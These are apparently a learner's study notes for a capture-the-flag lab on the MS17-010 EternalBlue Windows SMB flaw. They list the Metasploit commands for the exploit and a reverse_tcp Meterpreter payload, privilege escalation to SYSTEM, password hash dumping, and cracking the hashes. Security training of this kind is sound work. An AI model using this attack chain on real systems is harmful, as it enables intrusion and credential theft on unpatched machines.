# Blue (MS17-010 EternalBlue)
**Path:** CyberSec_101 - Exploitation Basics
**Date:** 2026-03-12
**Difficulty:** Easy

---

## Commands Used

- `nmap -sV -sC -p- <IP>` → Full scan with service detection
- `search ms17-010` → Find EternalBlue exploit in Metasploit
- `use exploit/windows/smb/ms17_010_eternalblue` → Select the exploit
- `show options` → See required settings
- `set RHOSTS <target IP>` → Set target
- `set LHOST <your IP>` → Set your attacker IP
- `set payload windows/x64/meterpreter/reverse_tcp` → Set Meterpreter payload
- `run` / `exploit` → Launch the exploit
- `getsystem` → Escalate to SYSTEM
- `getuid` → Confirm you are SYSTEM
- `hashdump` → Dump all password hashes
- `ps` → List running processes
- `migrate <PID>` → Move into another process

---

## Session Management (Important)

- `background` or `Ctrl+Z` → Send current session to background
- `sessions` or `sessions -l` → List all active sessions
- `sessions -i 1` → Re-enter session number 1
- `sessions -i 2` → Re-enter session number 2
- `sessions -k 1` → Kill session number 1
- `exploit -j` → Run exploit in background and keep session alive

---

## How to Get Meterpreter Shell Specifically

If you get a normal shell instead of Meterpreter, do this:

- Inside msfconsole before running exploit:
  `set payload windows/x64/meterpreter/reverse_tcp`

- If you already have a normal shell session and want to
  upgrade it to Meterpreter:
  `sessions -u <session number>`

- Or background the shell session and run:
  `use post/multi/manage/shell_to_meterpreter`
  `set SESSION <number>`
  `run`

---

## New Concepts

- MS17-010 is a critical SMB vulnerability in Windows 7
  and Server 2008 — allows remote code execution
- EternalBlue was an NSA exploit leaked in 2017 and used
  in the WannaCry ransomware attack
- Port 445 = SMB — always check this on Windows targets
- SMB (Server Message Block) is a protocol for file
  sharing between Windows machines
- NTLM hash format is: username:RID:LM_hash:NTLM_hash
  The actual password hash is the LAST part after third colon
- Hash cracking can be done:
  - Online → crackstation.net (fast, no setup)
  - Offline → hashcat or john the ripper
- x64 vs x86 payloads — always match target architecture
  Windows 7 modern = x64, older systems = x86
- Running exploit with -j flag runs it as a background job
  so session stays alive even if connection drops briefly

---

## Full Attack Flow for This Room

1. nmap scan → find port 445 open
2. search ms17-010 in msfconsole
3. use the eternalblue module
4. set RHOSTS and LHOST
5. set payload to x64 Meterpreter
6. run the exploit
7. get Meterpreter session
8. getsystem → escalate privileges
9. getuid → confirm SYSTEM access
10. hashdump → copy the NTLM hash
11. paste hash into crackstation.net → get plaintext password

---

## Gotchas / Surprises

- If exploit runs but session dies immediately → use exploit -j
- If getsystem fails → run ps, find a SYSTEM process,
  then migrate into it first
- Always set x64 payload for modern Windows targets
  x86 payload on x64 target will fail
- LM hash part (middle) is usually blank on modern Windows
  only the NTLM part (last) is needed for cracking
- crackstation.net cracks common hashes instantly for free
  only need hashcat if password is complex/custom

---

## My Understanding in Plain English

Blue exploits an unpatched Windows 7 machine via SMB.
EternalBlue sends a crafted packet to port 445 which
crashes the SMB service and gives you a shell. From
there you escalate to SYSTEM and dump all password
hashes which can then be cracked to get plaintext
passwords.

---

## Related Notes

- [[Metasploit Introduction]]
- [[Metasploit Exploitation]]
- [[Metasploit Meterpreter]]
- [[Exploitation Basics]]
